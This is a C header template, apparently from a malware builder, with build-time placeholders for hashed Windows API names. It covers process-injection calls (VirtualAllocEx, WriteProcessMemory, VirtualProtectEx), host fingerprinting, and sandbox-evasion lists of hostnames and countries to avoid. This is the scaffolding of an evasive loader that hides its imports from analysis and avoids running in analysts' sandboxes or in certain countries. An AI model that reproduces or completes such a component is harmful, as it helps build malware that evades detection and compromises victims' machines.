#ifndef OBJHASH_H
#define OBJHASH_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

// Structure to represent a hashed object with rotation details
typedef struct {
    unsigned int value;          // Hash value
    uint8_t rotation_value;      // Rotation value for the hash
    bool is_rotation_right;      // Direction of rotation
} ObjHash;

// statical hash constants for various modules and functions
static const ObjHash USER32_HASH = %MODHASH__user32.dll%;
static const ObjHash KERNEL32_HASH = %MODHASH__kernel32.dll%;

// Hashes for function names
static const ObjHash LOAD_LIBRARY_HASH = %FCTHASH__LoadLibraryA%;
static const ObjHash GET_PROC_ADDRESS_HASH = %FCTHASH__GetProcAddress%;
static const ObjHash QUERY_INFORMATION_PROCESS_HASH = %FCTHASH__NtQueryInformationProcess%;

// Hashes for system information functions
static const ObjHash GET_COMPUTER_NAME_HASH = %FCTHASH__GetComputerNameA%;
static const ObjHash GET_DISK_FREE_SPACE_HASH = %FCTHASH__GetDiskFreeSpaceExA%;
static const ObjHash GET_SYSTEM_INFO_HASH = %FCTHASH__GetSystemInfo%;
static const ObjHash GET_KEYBOARD_LAYOUT_HASH = %FCTHASH__GetKeyboardLayout%;
static const ObjHash GLOBAL_MEMORY_STATUS_HASH = %FCTHASH__GlobalMemoryStatusEx%;

// Hashes for language and locale functions
static const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH = %FCTHASH__GetSystemDefaultLangID%;
static const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH = %FCTHASH__GetSystemDefaultLCID%;

// Hashes for memory and thread management functions
static const ObjHash VIRTUAL_ALLOC_HASH = %FCTHASH__VirtualAllocEx%;
static const ObjHash WRITE_MEMORY_HASH = %FCTHASH__WriteProcessMemory%;
static const ObjHash VIRTUAL_PROTECT_HASH = %FCTHASH__VirtualProtectEx%;

// statical arrays and sizes for avoided hostnames and countries
static const ObjHash TARGET_HOSTNAME_PREFIX_HASH = %SANDBOX__TARGET_HOSTNAME%;
static const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[] = {
    %SANDBOX__AVOID_HOSTNAME%
};

// List of country codes to avoid
static const uint16_t AVOIDED_COUNTRIES[] = {
    %SANDBOX__AVOID_COUNTRIES%
};

// Sizes of the avoided hostname and country arrays
static const size_t AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE = sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES) / sizeof(AVOIDED_HOSTNAME_PREFIX_HASHES[0]);
static const size_t AVOIDED_COUNTRIES_SIZE = sizeof(AVOIDED_COUNTRIES) / sizeof(AVOIDED_COUNTRIES[0]);




#endif // OBJHASH_H